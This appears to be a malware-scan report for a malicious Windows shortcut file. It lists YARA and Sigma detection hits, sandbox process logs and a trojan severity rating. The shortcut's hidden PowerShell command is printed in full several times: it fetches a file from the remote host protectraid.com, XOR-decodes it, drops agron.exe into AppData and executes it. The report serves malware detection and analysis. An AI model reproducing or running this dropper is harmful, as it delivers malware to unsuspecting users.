attributes.magic: MS Windows shortcut, Has Description string, Has command line arguments, Icon number=97, ctime=Thu Dec 31 23:59:59 1969, mtime=Thu Dec 31 23:59:59 1969, atime=Thu Dec 31 23:59:59 1969, length=0, window=hidenormalshowminimized

crowdsourced_yara_results.description: Detects a suspiciously big LNK file - maybe with embedded content
crowdsourced_yara_results.author: Florian Roth (Nextron Systems)

crowdsourced_yara_results.description: Detects LNK file with suspicious content
crowdsourced_yara_results.author: Florian Roth (Nextron Systems)

crowdsourced_yara_results.description: Detects suspicious single byte XORed keyword 'Mozilla/5.0' - it uses yara's XOR modifier and therefore cannot print the XOR key. You can use the CyberChef recipe linked in the reference field to brute force the used key.
crowdsourced_yara_results.author: Florian Roth

crowdsourced_yara_results.description: Detects suspicious XORed MSDOS stub message
crowdsourced_yara_results.author: Florian Roth

crowdsourced_yara_results.description: Identifies PowerShell artefacts in shortcut (LNK) files.
crowdsourced_yara_results.author: @bartblaze

crowdsourced_yara_results.description: Identifies executable artefacts in shortcut (LNK) files.
crowdsourced_yara_results.author: @bartblaze

crowdsourced_yara_results.description: Identifies execution artefacts in shortcut (LNK) files.
crowdsourced_yara_results.author: @bartblaze

crowdsourced_yara_results.description: Identifies Microsoft Office artefacts in shortcut (LNK) files.
crowdsourced_yara_results.author: @bartblaze

crowdsourced_yara_results.description: Identifies shortcut (LNK) file larger than 100KB. Most goodware LNK files are smaller than 100KB.
crowdsourced_yara_results.author: @bartblaze

crowdsourced_yara_results.description: Identifies shortcut (LNK) file with equal or higher entropy than 6.5. Most goodware LNK files have a low entropy, lower than 6.
crowdsourced_yara_results.author: @bartblaze

crowdsourced_yara_results.description: Detects suspicious single byte XORed keyword 'Mozilla/5.0' - it uses yara's XOR modifier and therefore cannot print the XOR key. You can use the CyberChef recipe linked in the reference field to brute force the used key.
crowdsourced_yara_results.author: Florian Roth

crowdsourced_yara_results.description: This YARA file detects padded LNK files designed to exploit ZDI-CAN-25373.
crowdsourced_yara_results.author: Peter Girnus

sigma_analysis_results.rule_title: Read Contents From Stdin Via Cmd.EXE
sigma_analysis_results.rule_description: Detect the use of "<" to read and potentially execute a file via cmd.exe

match_context.values: @{CommandLine=C:\Windows\system32\cmd.exe /c pOwErshEll.exe -w hidden $lnkpath = \\\\protectraid.com@80\\Downloads\\VASY.lnk; $file = gc $lnkpath -Encoding Byte; for($i=0; $i -lt $file.count; $i++) { $file[$i] = $file[$i] -bxor 0xD0 }; $appdata = C:\\Users\\<USER>\\AppData\\Roaming\\; $path = C:\\Users\\<USER>\\AppData\\Roaming\\ + agron + .exe; sc $path ([byte[]]($file ^| select -Skip 002814)) -Encoding Byte; ^& $path;; Image=C:\Windows\system32\cmd.exe; EventID=1}

sigma_analysis_results.rule_description: Detects presence of a potentially xor encoded powershell command
sigma_analysis_results.rule_author: Sami Ruohonen, Harish Segar, Tim Shelton, Teymur Kheirkhabarov, Vasiliy Burov, oscd.community, Nasreddine Bencherchali

match_context.values: @{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\george\Desktop\; OriginalFileName=PowerShell.EXE; Hashes=SHA1=1B3B40FBC889FD4C645CC12C85D0805AC36BA254,MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; Description=Windows PowerShell; EventID=1; ParentCommandLine="C:\Windows\system32\cmd.exe"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        [TRUNCATED]; CommandLine=pOwErshEll.exe  -w hidden $lnkpath = '\\protectraid.com@80\Downloads\VASY.lnk'; $file = gc $lnkpath -Encoding Byte; for($i=0; $i -lt $file.count; $i++) { $file[$i] = $file[$i] -bxor 0xD0 }; $appdata = 'C:\Users\george\AppData\Roaming\'; $path = 'C:\Users\george\AppData\Roaming\' + 'agron' + '.exe'; sc $path ([byte[]]($file | select -Skip 002814)) -Encoding Byte; & $path;; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentImage=C:\Windows\System32\cmd.exe; IntegrityLevel=High; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description: Detects a suspicious command line execution that invokes PowerShell with reference to an AppData folder
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community

match_context.values: @{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\george\Desktop\; OriginalFileName=Cmd.Exe; Hashes=SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE; Description=Windows Command Processor; EventID=1; ParentCommandLine=C:\Windows\Explorer.EXE; CommandLine="C:\Windows\system32\cmd.exe"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        [TRUNCATED]; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentImage=C:\Windows\explorer.exe; IntegrityLevel=High; Image=C:\Windows\System32\cmd.exe; Company=Microsoft Corporation}

@{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\Bruno\Desktop\; OriginalFileName=Cmd.Exe; Hashes=MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18; Description=Windows Command Processor; FileVersion=10.0.19041.746 (WinBuild.160101.0800); EventID=1; CommandLine="C:\Windows\system32\cmd.exe"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        [TRUNCATED]; IntegrityLevel=High; Image=C:\Windows\System32\cmd.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_title: Hidden Powershell in Link File Pattern
sigma_analysis_results.rule_description: Detects events that appear when a user click on a link file with a powershell command in it

match_context.values: @{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\george\Desktop\; OriginalFileName=Cmd.Exe; Hashes=SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE; Description=Windows Command Processor; EventID=1; ParentCommandLine=C:\Windows\Explorer.EXE; CommandLine="C:\Windows\system32\cmd.exe"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        [TRUNCATED]; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentImage=C:\Windows\explorer.exe; IntegrityLevel=High; Image=C:\Windows\System32\cmd.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_title: Potential Binary Or Script Dropper Via PowerShell
sigma_analysis_results.rule_description: Detects PowerShell creating a binary executable or a script file.
Detects non-interactive PowerShell activity by looking at the "powershell" process with a non-user GUI process such as "explorer.exe" as a parent.

match_context.values: @{Hashes=SHA1=1B3B40FBC889FD4C645CC12C85D0805AC36BA254,MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; CurrentDirectory=C:\Users\george\Desktop\; OriginalFileName=PowerShell.EXE; Product=Microsoft\xae Windows\xae Operating System; Description=Windows PowerShell; EventID=1; ParentCommandLine="C:\Windows\system32\cmd.exe"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        [TRUNCATED]; CommandLine=pOwErshEll.exe  -w hidden $lnkpath = '\\protectraid.com@80\Downloads\VASY.lnk'; $file = gc $lnkpath -Encoding Byte; for($i=0; $i -lt $file.count; $i++) { $file[$i] = $file[$i] -bxor 0xD0 }; $appdata = 'C:\Users\george\AppData\Roaming\'; $path = 'C:\Users\george\AppData\Roaming\' + 'agron' + '.exe'; sc $path ([byte[]]($file | select -Skip 002814)) -Encoding Byte; & $path;; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentImage=C:\Windows\System32\cmd.exe; IntegrityLevel=High; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

lnk_info.command_line_arguments: /c pOwErshEll.exe -w hidden $lnkpath = '\\protectraid.com@80\Downloads\VASY.lnk'; $file = gc $lnkpath -Encoding Byte; for($i=0; $i -lt $file.count; $i++) { $file[$i] = $file[$i] -bxor 0xD0 }; $appdata = '%APPDATA%\'; $path = '%APPDATA%\' + 'agron' + '.exe'; sc $path ([byte[]]($file ^| select -Skip 002814)) -Encoding Byte; ^& $path;

threat_severity.level_description: Severity HIGH because it was considered trojan. Other contributing factor was that it could not be run in sandboxes.
